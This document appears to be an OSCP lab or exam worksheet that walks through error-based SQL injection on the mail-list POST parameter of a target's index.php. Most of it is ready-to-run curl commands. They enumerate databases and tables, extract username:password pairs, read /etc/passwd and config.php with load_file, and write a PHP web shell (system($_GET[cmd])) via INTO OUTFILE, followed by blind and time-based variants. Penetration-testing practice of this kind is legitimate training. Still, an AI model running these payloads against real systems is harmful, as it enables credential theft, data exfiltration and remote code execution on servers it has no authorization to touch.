# SQL Injection Breakthrough Documentation
**Vulnerability**: Error-based SQL Injection
**Location**: index.php - mail-list parameter
**Method**: POST request

---

## Vulnerability Details

### Discovery Command:
```bash
curl -X POST http://192.168.145.48/index.php -d "mail-list=test@test.com'" -s | grep -i error
```

### Error Message Received:
```sql
You have an error in your SQL syntax; check the manual that corresponds
to your MySQL server version for the right syntax to use near ''test@test.com''' at line 1
```

### What This Reveals:
- Direct SQL query execution
- No prepared statements
- No input escaping
- Error messages exposed (information disclosure)

---

## Exploitation Commands to Execute

### Step 1: Column Count Discovery
```bash
# Test with ORDER BY
curl -X POST http://192.168.145.48/index.php -d "mail-list=test' ORDER BY 1-- -" -s | grep -i error
curl -X POST http://192.168.145.48/index.php -d "mail-list=test' ORDER BY 2-- -" -s | grep -i error
curl -X POST http://192.168.145.48/index.php -d "mail-list=test' ORDER BY 3-- -" -s | grep -i error

# Alternative: UNION SELECT with NULL
curl -X POST http://192.168.145.48/index.php -d "mail-list=test' UNION SELECT NULL-- -" -s | grep -i error
curl -X POST http://192.168.145.48/index.php -d "mail-list=test' UNION SELECT NULL,NULL-- -" -s | grep -i error
```

### Step 2: Database Information Gathering
```bash
# Get database name
curl -X POST http://192.168.145.48/index.php -d "mail-list=test' UNION SELECT database()-- -" -s | tail -20

# Get MySQL version
curl -X POST http://192.168.145.48/index.php -d "mail-list=test' UNION SELECT @@version-- -" -s | tail -20

# Get current user
curl -X POST http://192.168.145.48/index.php -d "mail-list=test' UNION SELECT user()-- -" -s | tail -20

# Get all database names
curl -X POST http://192.168.145.48/index.php -d "mail-list=test' UNION SELECT schema_name FROM information_schema.schemata-- -" -s | tail -20
```

### Step 3: Table Enumeration
```bash
# Get all tables in current database
curl -X POST http://192.168.145.48/index.php -d "mail-list=test' UNION SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()-- -" -s | tail -20

# If group_concat fails, iterate with LIMIT
curl -X POST http://192.168.145.48/index.php -d "mail-list=test' UNION SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1-- -" -s | tail -20
curl -X POST http://192.168.145.48/index.php -d "mail-list=test' UNION SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1,1-- -" -s | tail -20
```

### Step 4: Column Discovery
```bash
# Get columns for specific table (replace TABLE_NAME)
curl -X POST http://192.168.145.48/index.php -d "mail-list=test' UNION SELECT group_concat(column_name) FROM information_schema.columns WHERE table_name='TABLE_NAME'-- -" -s | tail -20

# Get columns with more details
curl -X POST http://192.168.145.48/index.php -d "mail-list=test' UNION SELECT concat(column_name,':',data_type) FROM information_schema.columns WHERE table_name='TABLE_NAME'-- -" -s | tail -20
```

### Step 5: Data Extraction
```bash
# Generic extraction (adjust table/column names)
curl -X POST http://192.168.145.48/index.php -d "mail-list=test' UNION SELECT concat(username,':',password) FROM users-- -" -s | tail -20

# Extract with multiple columns
curl -X POST http://192.168.145.48/index.php -d "mail-list=test' UNION SELECT concat_ws('|',col1,col2,col3) FROM table_name-- -" -s | tail -20
```

### Step 6: Advanced Exploitation
```bash
# Read files from system
curl -X POST http://192.168.145.48/index.php -d "mail-list=test' UNION SELECT load_file('/etc/passwd')-- -" -s | tail -50
curl -X POST http://192.168.145.48/index.php -d "mail-list=test' UNION SELECT load_file('/var/www/html/config.php')-- -" -s | tail -50

# Attempt webshell write
curl -X POST http://192.168.145.48/index.php -d "mail-list=test' UNION SELECT '<?php system(\$_GET[cmd]); ?>' INTO OUTFILE '/var/www/html/cmd.php'-- -" -s

# Check if webshell exists
curl http://192.168.145.48/cmd.php?cmd=whoami
```

---

## Manual Exploitation Methodology

### Understanding the Query Structure
Based on the error, the backend query likely looks like:
```sql
INSERT INTO subscribers (email) VALUES ('$mail-list');
-- OR
INSERT INTO mailing_list VALUES ('$mail-list');
```

### Why Our Injection Works
```sql
-- Original query:
INSERT INTO table VALUES ('test@test.com');

-- With our injection:
INSERT INTO table VALUES ('test' UNION SELECT database()-- -');
                          └─ Closes the quote
                               └─ Our payload
                                                      └─ Comments out the rest
```

### Comment Syntax Options
- `-- -` (with space and dash)
- `#` (hash comment)
- `/* comment */` (C-style)

---

## Troubleshooting Guide

### If ORDER BY doesn't work:
- Try without spaces: `mail-list=test'ORDER BY 1--+`
- Try URL encoding: `mail-list=test%27%20ORDER%20BY%201--%20-`

### If UNION SELECT fails:
- Check column count is correct
- Try UNION ALL SELECT
- Ensure data types match

### If no output visible:
- Use substring: `UNION SELECT substring(database(),1,1)-- -`
- Try blind SQLi time-based: `test' AND SLEEP(5)-- -`
- Check different comment styles

---

## Expected Outcomes

### Success Indicators:
- No SQL errors = valid syntax
- Different page content = data returned
- Delay in response = time-based SQLi working

### Common Tables to Look For:
- users, admin, members
- credentials, passwords
- config, settings
- sessions, tokens

---

## OSCP Exam Notes

### Time Budget:
- Column discovery: 5-10 minutes
- Database enum: 10-15 minutes
- Data extraction: 15-20 minutes
- Total SQLi phase: 30-45 minutes

### Key Reminders:
1. Always try manual before sqlmap
2. Document every working payload
3. Note exact syntax that works
4. Save credentials immediately
5. Check for file permissions

---

## Current Exploitation Status
- [x] Vulnerability confirmed
- [ ] Column count determined
- [ ] Database name extracted
- [ ] Tables enumerated
- [ ] Credentials found
- [ ] Shell uploaded
- [ ] Flag captured